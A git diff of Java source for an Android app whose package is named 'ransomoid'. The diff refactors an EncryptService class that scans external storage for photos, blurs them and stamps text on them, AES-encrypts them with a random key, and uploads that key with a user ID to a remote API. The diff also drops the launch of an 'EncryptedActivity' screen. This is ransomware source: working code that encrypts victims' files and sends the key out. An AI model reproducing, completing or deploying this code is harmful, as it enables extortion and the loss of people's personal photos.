@@ -11,28 +11,20 @@ import java.io.File;
 import java.util.ArrayList;
 import java.util.UUID;
 
-import falezza.fabio.ransomoid.activities.EncryptedActivity;
 import falezza.fabio.ransomoid.utils.AesEncrypter;
 import falezza.fabio.ransomoid.utils.Api;
 import falezza.fabio.ransomoid.utils.AppDelegate;
 import falezza.fabio.ransomoid.utils.FileProcessor;
 import falezza.fabio.ransomoid.utils.ImageProcessor;
 
-public class EncryptService extends Service {
+public class EncryptService extends ParentService {
 
-    private static final String[] imgExtensions =
-            {".jpg", ".jpeg", ".png", ".JPG", ".PNG", ".JPEG"};
 
-    private static final String[] excludeExtensions = {"Android/data", ".thumbnails"};
-
-    ArrayList<File> imgList;
 
     @Override
     public void onCreate() {
         super.onCreate();
-        FileProcessor fileProcessor = FileProcessor.getInstance();
-        this.imgList = fileProcessor.getFiles(Environment.getExternalStorageDirectory(),
-                imgExtensions, excludeExtensions);
+
         this.encrypt();
     }
 
@@ -44,7 +36,7 @@ public class EncryptService extends Service {
             aesEncrypter.generateRandomKey();
             this.generateId();
             for (File img : this.imgList) {
-                if (!isEncrypted(img)) {
+                if (!this.isEncrypted(img)) {
                     imgProcessor.setFile(img);
                     imgProcessor.blur();
                     imgProcessor.drawText();
@@ -61,25 +53,17 @@ public class EncryptService extends Service {
                 }
             }
 
-            Api.getInstance(this).send(
+            Api.getInstance(this).sendNewRecord(
                     AppDelegate.getInstance(this).getByTag(AppDelegate.userID),
-                    Base64.encodeToString(aesEncrypter.getKey(), Base64.DEFAULT));
-
+                    Base64.encodeToString(aesEncrypter.getKey(), Base64.NO_WRAP));
         } catch (Exception e) {
             e.printStackTrace();
         }
-
-        Intent intent = new Intent(this, EncryptedActivity.class);
-        startActivity(intent);
     }
 
     @Override
     public IBinder onBind(Intent intent) {
         return null;
-    }
-
-    private boolean isEncrypted(File file) {
-        return file.getPath().contains(".enc");
     }
 
     private void generateId() {
